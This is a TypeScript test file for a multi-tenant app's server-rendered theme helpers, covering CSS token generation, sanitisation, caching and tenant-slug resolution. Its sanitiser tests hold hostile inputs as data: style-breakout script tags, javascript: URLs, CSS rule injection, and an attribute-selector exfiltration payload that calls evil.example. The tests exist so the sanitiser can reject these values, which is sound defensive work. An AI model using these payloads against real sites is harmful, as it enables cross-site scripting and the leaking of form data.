/**
 * Server-side tenant-theme tests — Task 58.1 / Requirement 28.1, 28.10
 *
 * Verifies the SSR helpers that `app/layout.tsx` uses to emit the
 * `<style data-tenant-theme>` block on first paint:
 *
 *   • `brandToTenantTokens()`   — round-trips a `Brand` into the seven
 *     `--tenant-*` token strings without losing precision.
 *   • `renderTenantThemeCSS()`  — produces a single-line `:root { ... }`
 *     CSS block that ParserHTMLs to valid CSS.
 *   • `getPublishedTenantTheme()` — caches the resolved tokens with the
 *     5-minute (`SSR_THEME_CACHE_TTL_MS`) TTL and falls back to the
 *     ProctiraERP defaults on fetcher failure.
 *   • `resolveRequestTenantSlug()` — picks the tenant slug from the
 *     middleware-set `X-Tenant-Slug` header first, then `X-Tenant-ID`,
 *     then `'default'`.
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';

import {
  brandToTenantTokens,
  clearSSRThemeCache,
  fetchPublishedThemeFromGateway,
  getPublishedTenantTheme,
  isSafeGradient,
  PUBLISHED_THEME_PATH,
  renderTenantThemeCSS,
  resolveRequestTenantSlug,
  SSR_THEME_CACHE_TTL_MS,
  TENANT_CSS_VARIABLE_NAMES,
} from './server';
import { DEFAULT_BRAND, type Brand } from '@/providers/BrandConfigProvider';

const SAMPLE_BRAND: Brand = {
  name: 'EduZo',
  shortName: 'eduzo',
  slug: 'eduzo',
  logo: { url: 'https://cdn.example.test/eduzo/logo.svg', alt: 'EduZo' },
  favicon: 'https://cdn.example.test/eduzo/favicon.ico',
  primary_color: 'hsl(280, 70%, 45%)',
  accent_color: 'hsl(40, 90%, 55%)',
  login_background: 'linear-gradient(135deg, hsl(280, 70%, 30%), hsl(280, 70%, 50%))',
  document_title_template: '{page} · {brand}',
};

beforeEach(() => {
  clearSSRThemeCache();
  vi.restoreAllMocks();
});

describe('brandToTenantTokens — Brand → --tenant-* token strings', () => {
  it('produces single-quoted CSS strings for name/shortName', () => {
    const tokens = brandToTenantTokens(SAMPLE_BRAND);
    expect(tokens.name).toBe(`'${SAMPLE_BRAND.name}'`);
    expect(tokens.shortName).toBe(`'${SAMPLE_BRAND.shortName}'`);
  });

  it('wraps logo and favicon in url("...")', () => {
    const tokens = brandToTenantTokens(SAMPLE_BRAND);
    expect(tokens.logo).toBe(`url("${SAMPLE_BRAND.logo.url}")`);
    expect(tokens.favicon).toBe(`url("${SAMPLE_BRAND.favicon}")`);
  });

  it('passes through colors and login background verbatim', () => {
    const tokens = brandToTenantTokens(SAMPLE_BRAND);
    expect(tokens.primary).toBe(SAMPLE_BRAND.primary_color);
    expect(tokens.accent).toBe(SAMPLE_BRAND.accent_color);
    expect(tokens.loginBackground).toBe(SAMPLE_BRAND.login_background);
  });

  it('escapes single quotes in tenant names', () => {
    const tricky: Brand = { ...SAMPLE_BRAND, name: "Tom's School", shortName: "tom's" };
    const tokens = brandToTenantTokens(tricky);
    expect(tokens.name).toBe("'Tom\\'s School'");
    expect(tokens.shortName).toBe("'tom\\'s'");
  });

  // PRC-M616: a hostile name must not be able to close the <style> element.
  it('escapes angle brackets so a name cannot break out of <style>', () => {
    const hostile: Brand = { ...SAMPLE_BRAND, name: '</style><script>alert(1)</script>' };
    const tokens = brandToTenantTokens(hostile);
    expect(tokens.name).not.toContain('</style>');
    expect(tokens.name).not.toContain('<');
    expect(tokens.name).not.toContain('>');
  });

  // PRC-L409: colours and URLs are validated against an allow-list and fall
  // back to the default on any value that could inject CSS/markup.
  it('rejects a colour that tries to inject extra CSS rules', () => {
    const hostile: Brand = {
      ...SAMPLE_BRAND,
      primary_color: 'red;} body{display:none}',
      accent_color: '#abc',
    };
    const tokens = brandToTenantTokens(hostile);
    expect(tokens.primary).toBe(DEFAULT_BRAND.primary_color);
    // a valid short hex is still accepted
    expect(tokens.accent).toBe('#abc');
  });

  it('rejects javascript: and data: URLs for logo/favicon', () => {
    const hostile: Brand = {
      ...SAMPLE_BRAND,
      logo: { url: 'javascript:alert(1)', alt: 'x' },
      favicon: 'data:text/html,<script>',
    };
    const tokens = brandToTenantTokens(hostile);
    expect(tokens.logo).toBe(`url("${DEFAULT_BRAND.logo.url}")`);
    expect(tokens.favicon).toBe(`url("${DEFAULT_BRAND.favicon}")`);
  });

  it('accepts https and site-relative URLs for logo/favicon', () => {
    const ok: Brand = {
      ...SAMPLE_BRAND,
      logo: { url: 'https://cdn.example.test/logo.svg', alt: 'x' },
      favicon: '/favicon.ico',
    };
    const tokens = brandToTenantTokens(ok);
    expect(tokens.logo).toBe('url("https://cdn.example.test/logo.svg")');
    expect(tokens.favicon).toBe('url("/favicon.ico")');
  });

  it('rejects a login background that tries to break out', () => {
    const hostile: Brand = {
      ...SAMPLE_BRAND,
      login_background: 'url("x")</style><script>',
    };
    const tokens = brandToTenantTokens(hostile);
    expect(tokens.loginBackground).toBe(DEFAULT_BRAND.login_background);
  });

  // PRC-M616 / PRC-L409: the gradient is emitted raw into :root{…}, so it must
  // not be able to close the declaration/rule or pull in a resource.
  const RULE_INJECTION =
    'linear-gradient(red,blue);} body{display:none} :root{--x:linear-gradient(a)';
  it.each([
    ['rule injection via ;}', RULE_INJECTION],
    [
      'attribute-selector exfiltration',
      'linear-gradient(red,blue);} input[value^=a]{background:url(https://evil.example/a)} :root{--x:linear-gradient(red,blue)',
    ],
    ['nested url(', 'linear-gradient(red, url(https://evil.example/a))'],
    ['uppercase URL(', 'linear-gradient(red, URL(https://evil.example/a))'],
    ['semicolon only', 'linear-gradient(red, blue); color: red'],
    ['brace only', 'linear-gradient(red, blue)}'],
    ['backslash escape', 'linear-gradient(red, \\75 rl(x))'],
    ['comment', 'linear-gradient(red /* x */, blue)'],
    ['at-rule', 'linear-gradient(red, blue) @import x'],
    ['angle bracket', 'linear-gradient(red, blue)</style>'],
    ['double quote', 'linear-gradient(red, "blue")'],
    ['single quote', "linear-gradient(red, 'blue')"],
    ['newline', 'linear-gradient(red,\nblue)'],
    ['unbalanced open', 'linear-gradient(red, hsl(1, 2%, 3%)'],
    ['unbalanced close', 'linear-gradient(red, blue))'],
    ['trailing content after close', 'linear-gradient(red) , radial-gradient(blue)'],
  ])('rejects a login background gradient with %s', (_label, value) => {
    expect(isSafeGradient(value)).toBe(false);
    const tokens = brandToTenantTokens({ ...SAMPLE_BRAND, login_background: value });
    expect(tokens.loginBackground).toBe(DEFAULT_BRAND.login_background);
  });

  it('keeps injected rules out of the rendered :root block', () => {
    const css = renderTenantThemeCSS(
      brandToTenantTokens({ ...SAMPLE_BRAND, login_background: RULE_INJECTION }),
    );
    expect(css).not.toContain('display:none');
    expect(css).not.toContain('body{');
  });

  it.each([
    'url(https://evil.example/a);} body{display:none}',
    'url(https://evil.example/a) red',
    'url(javascript:alert(1))',
  ])('rejects a hostile top-level url( login background %#', (value) => {
    const tokens = brandToTenantTokens({ ...SAMPLE_BRAND, login_background: value });
    expect(tokens.loginBackground).toBe(DEFAULT_BRAND.login_background);
  });

  it.each([
    'linear-gradient(135deg, hsl(280, 70%, 30%), hsl(280, 70%, 50%))',
    'radial-gradient(circle at 50% 50%, #fff 0%, #000 100%)',
    'linear-gradient(to right, rgba(0, 0, 0, 0.5), hsl(222 47% 11% / 0.8))',
  ])('accepts a well-formed gradient %#', (value) => {
    expect(isSafeGradient(value)).toBe(true);
    expect(brandToTenantTokens({ ...SAMPLE_BRAND, login_background: value }).loginBackground).toBe(
      value,
    );
  });
});

describe('renderTenantThemeCSS — :root { --tenant-* } block', () => {
  it('emits all seven custom properties on :root', () => {
    const css = renderTenantThemeCSS(brandToTenantTokens(SAMPLE_BRAND));
    expect(css.startsWith(':root{')).toBe(true);
    expect(css.endsWith('}')).toBe(true);
    for (const name of TENANT_CSS_VARIABLE_NAMES) {
      expect(css).toContain(`${name}:`);
    }
  });

  it('keeps the output on a single compact line for HTML payload size', () => {
    const css = renderTenantThemeCSS(brandToTenantTokens(SAMPLE_BRAND));
    expect(css).not.toContain('\n');
  });

  it('exposes exactly the seven --tenant-* names that the client provider writes', () => {
    expect(TENANT_CSS_VARIABLE_NAMES).toEqual([
      '--tenant-name',
      '--tenant-shortName',
      '--tenant-primary',
      '--tenant-accent',
      '--tenant-logo',
      '--tenant-favicon',
      '--tenant-login-bg',
    ]);
  });
});

describe('getPublishedTenantTheme — server-side cache + fallback', () => {
  it('calls the fetcher on cache miss and caches the result', async () => {
    const fetcher = vi.fn().mockResolvedValue(SAMPLE_BRAND);
    const a = await getPublishedTenantTheme('eduzo', fetcher);
    const b = await getPublishedTenantTheme('eduzo', fetcher);

    expect(a.fromCache).toBe(false);
    expect(b.fromCache).toBe(true);
    expect(fetcher).toHaveBeenCalledTimes(1);
    expect(b.tokens.primary).toBe(SAMPLE_BRAND.primary_color);
  });

  it('lowercases the tenant slug before keying the cache', async () => {
    const fetcher = vi.fn().mockResolvedValue(SAMPLE_BRAND);
    await getPublishedTenantTheme('EduZo', fetcher);
    const second = await getPublishedTenantTheme('eduzo', fetcher);
    expect(second.fromCache).toBe(true);
    expect(fetcher).toHaveBeenCalledTimes(1);
  });

  it('falls back to DEFAULT_BRAND tokens when the fetcher throws', async () => {
    const fetcher = vi.fn().mockRejectedValue(new Error('upstream offline'));
    const result = await getPublishedTenantTheme('eduzo', fetcher);
    expect(result.brand).toEqual(DEFAULT_BRAND);
    expect(result.tokens.primary).toBe(DEFAULT_BRAND.primary_color);
  });

  it('refetches once the cache TTL has elapsed', async () => {
    vi.useFakeTimers();
    try {
      const fetcher = vi.fn().mockResolvedValue(SAMPLE_BRAND);

      await getPublishedTenantTheme('eduzo', fetcher);
      expect(fetcher).toHaveBeenCalledTimes(1);

      vi.setSystemTime(new Date(Date.now() + SSR_THEME_CACHE_TTL_MS + 1));
      await getPublishedTenantTheme('eduzo', fetcher);
      expect(fetcher).toHaveBeenCalledTimes(2);
    } finally {
      vi.useRealTimers();
    }
  });

  it('defaults the slug to "default" when called with an empty string', async () => {
    const fetcher = vi.fn().mockResolvedValue(SAMPLE_BRAND);
    const result = await getPublishedTenantTheme('', fetcher);
    expect(result.tenantSlug).toBe('default');
  });
});

describe('resolveRequestTenantSlug — header-based tenant resolution', () => {
  it('prefers x-tenant-slug over x-tenant-id', async () => {
    const headers = new Map<string, string>([
      ['x-tenant-slug', 'eduzo'],
      ['x-tenant-id', 'ministry-edu'],
    ]);
    const slug = await resolveRequestTenantSlug({
      get: (name: string) => headers.get(name) ?? null,
    });
    expect(slug).toBe('eduzo');
  });

  it('falls back to x-tenant-id when x-tenant-slug is absent', async () => {
    const headers = new Map<string, string>([['x-tenant-id', 'ministry-edu']]);
    const slug = await resolveRequestTenantSlug({
      get: (name: string) => headers.get(name) ?? null,
    });
    expect(slug).toBe('ministry-edu');
  });

  it('returns "default" when no tenant headers are present', async () => {
    const slug = await resolveRequestTenantSlug({ get: () => null });
    expect(slug).toBe('default');
  });

  it('lowercases the resolved slug', async () => {
    const slug = await resolveRequestTenantSlug({ get: () => 'MINISTRY-EDU' });
    expect(slug).toBe('ministry-edu');
  });
});

describe('PUBLISHED_THEME_PATH — endpoint contract (PRC-M132)', () => {
  it('targets the gateway public branding endpoint served by the registration surface', () => {
    expect(PUBLISHED_THEME_PATH).toBe('/api/v1/registrations/branding');
  });
});

/** PRC-M132: transport stub returning a JSON body. */
function jsonTransport(payload: unknown, status = 200) {
  return vi.fn(async () => ({ status, body: JSON.stringify(payload) }));
}

/**
 * The module keeps its own copy of `normalizeBrandResponse`, so the token mapping is
 * asserted here too (an untested copy is how the two drift apart).
 */
describe('fetchPublishedThemeFromGateway — published tokens → Brand (mapping only)', () => {
  beforeEach(() => {
    clearSSRThemeCache();
    vi.unstubAllGlobals();
  });
  it('applies published tokens rather than falling back to the default brand', async () => {
    const transport = jsonTransport({
      tokens: {
        '--tenant-name': "'EduZo'",
        '--tenant-primary': 'hsl(12, 76%, 41%)',
        '--tenant-logo': 'url("/cdn/eduzo/logo.svg")',
      },
      revision: 4,
    });
    const brand = await fetchPublishedThemeFromGateway('eduzo', 'eduzo.proctira.org', transport);

    expect(brand.name).toBe('EduZo');
    expect(brand.primary_color).toBe('hsl(12, 76%, 41%)');
    expect(brand.logo.url).toBe('/cdn/eduzo/logo.svg');
    // Unpublished slots still inherit the platform default.
    expect(brand.accent_color).toBe('hsl(174, 62%, 40%)');
  });

  it('keeps the default short name when the published tokens carry no name', async () => {
    // shortName keys client storage, so deriving it from a defaulted name would
    // rewrite the SSR `--tenant-shortName` token to 'proctiraerp' and move every
    // user's saved theme and locale to an unwritten key.
    const transport = jsonTransport({ tokens: { '--tenant-primary': '#123456' } });
    const brand = await fetchPublishedThemeFromGateway('eduzo', 'eduzo.proctira.org', transport);
    expect(brand.shortName).toBe('proctira');
    expect(brandToTenantTokens(brand).shortName).toBe("'proctira'");
  });
});

describe('PRC-M132: SSR branding fetch forwards the request Host', () => {
  beforeEach(() => {
    clearSSRThemeCache();
  });

  it('sends the incoming Host and the slug to the public branding endpoint', async () => {
    const transport = jsonTransport({ slug: 'eduzo', name: 'EduZo', primaryColor: '#0f766e' });
    const brand = await fetchPublishedThemeFromGateway('eduzo', 'EduZo.Proctira.org', transport);
    expect(transport).toHaveBeenCalledTimes(1);
    const [url, host] = transport.mock.calls[0] as unknown as [string, string];
    expect(new URL(url).pathname).toBe('/api/v1/registrations/branding');
    expect(new URL(url).searchParams.get('slug')).toBe('eduzo');
    expect(host).toBe('eduzo.proctira.org');
    expect(brand.name).toBe('EduZo');
    expect(brand.primary_color).toBe('#0f766e');
  });

  it('without a usable Host it does not fetch and renders the default brand', async () => {
    for (const host of [undefined, '', 'evil host', 'a/b', '<script>']) {
      const transport = jsonTransport({ name: 'Should not be used' });
      const brand = await fetchPublishedThemeFromGateway('eduzo', host, transport);
      expect(transport).not.toHaveBeenCalled();
      expect(brand.name).toBe('ProctiraERP');
    }
  });

  it('a 404 (Host/slug mismatch at the gateway) renders the default brand', async () => {
    const transport = jsonTransport({ code: 'PUBLIC_BRANDING_NOT_FOUND' }, 404);
    const brand = await fetchPublishedThemeFromGateway('eduzo', 'other.proctira.org', transport);
    expect(brand.name).toBe('ProctiraERP');
  });

  it('caches per Host and slug, so two hosts never share a brand', async () => {
    const fetcher = vi.fn(async (_slug: string, host?: string) => ({
      ...(await fetchPublishedThemeFromGateway(
        'eduzo',
        host,
        jsonTransport({ name: host === 'a.proctira.org' ? 'Alpha' : 'Beta' }),
      )),
    }));
    const a = await getPublishedTenantTheme('eduzo', fetcher, 'a.proctira.org');
    const b = await getPublishedTenantTheme('eduzo', fetcher, 'b.proctira.org');
    expect(a.brand.name).toBe('Alpha');
    expect(b.brand.name).toBe('Beta');
    expect(fetcher).toHaveBeenCalledTimes(2);
  });
});
